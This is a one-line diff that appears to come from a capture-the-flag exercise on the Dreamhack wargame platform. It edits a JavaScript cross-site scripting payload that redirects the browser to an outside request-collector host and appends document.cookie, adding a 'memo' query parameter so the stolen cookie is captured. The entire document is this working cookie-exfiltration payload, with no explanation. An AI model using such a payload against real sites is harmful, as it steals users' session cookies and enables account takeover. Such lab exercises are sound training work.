@@ -1,1 +1,1 @@
-location.href="https://oupuhjz.request.dreamhack.games"+document.cookie;
+location.href="https://oupuhjz.request.dreamhack.games/?memo="+document.cookie;
